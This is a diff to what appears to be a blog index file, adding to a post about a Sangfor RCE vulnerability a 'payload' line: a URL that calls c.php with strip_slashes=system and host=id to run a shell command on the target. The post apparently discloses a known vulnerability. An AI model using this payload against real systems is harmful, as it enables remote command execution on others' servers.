@@ -5,6 +5,8 @@
     <url>/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DRCE/</url>
     <content><![CDATA[<p><img data-src="/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DRCE/rce.png" alt="rce.png"></p>
 <a id="more"></a>
+<p>payload:</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http<span class="variable">s:</span>//<span class="number">192.168</span>.<span class="number">151.1</span>.<span class="number">0</span>/tool/<span class="built_in">log</span>/<span class="keyword">c</span>.php?strip_slashes=<span class="built_in">system</span>&amp;host=id</span><br></pre></td></tr></table></figure>
 <p><img data-src="/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DRCE/1.png" alt="1.png"></p>
 ]]></content>
       <categories>
